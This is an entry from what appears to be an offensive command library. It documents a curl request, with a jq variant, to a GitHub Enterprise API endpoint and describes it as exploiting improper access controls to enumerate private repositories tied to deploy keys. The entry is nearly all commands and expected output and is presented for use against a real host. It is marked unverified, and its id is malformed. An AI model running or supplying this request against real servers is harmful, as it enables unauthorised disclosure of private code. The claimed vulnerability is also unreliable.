---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X GET
  'https://github-enterprise.example.com/api/v3/deploy_keys/lfs_repos' -H
  'Accept: application/vnd.github.v3+json'
tags:
  - api
  - enumeration
  - recon
type: command
output: JSON array of repository objects with names and owners
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:39.509Z'
verified: false
validated: true
submitted: true
---
# curl-lfs-enumerate

## Command

```bash
curl -X GET 'https://github-enterprise.example.com/api/v3/deploy_keys/lfs_repos' -H 'Accept: application/vnd.github.v3+json'
```

## Description

This command queries the internal LFS API endpoint in GitHub Enterprise Server to enumerate private repositories associated with deploy keys, exploiting improper access controls for information disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| URL | Target API endpoint (replace with actual host) | Yes |
| `-H 'Accept: ...'` | Sets JSON response format header | Yes |

## Examples

### Basic Usage

```bash
curl -X GET 'https://github-enterprise.example.com/api/v3/deploy_keys/lfs_repos' -H 'Accept: application/vnd.github.v3+json'
```

### Advanced Usage

```bash
curl -s -X GET 'https://github-enterprise.example.com/api/v3/deploy_keys/lfs_repos' -H 'Accept: application/vnd.github.v3+json' | jq '.["repos"]'
```

## Expected Output

A JSON response like: {"repos": [{"id": 123, "name": "private-repo", "owner": {"login": "org"}}]}. Errors indicate patching or misconfiguration.

## Related

- [[Related Procedure: Enumerate-Private-Repos-via-LFS-API]]
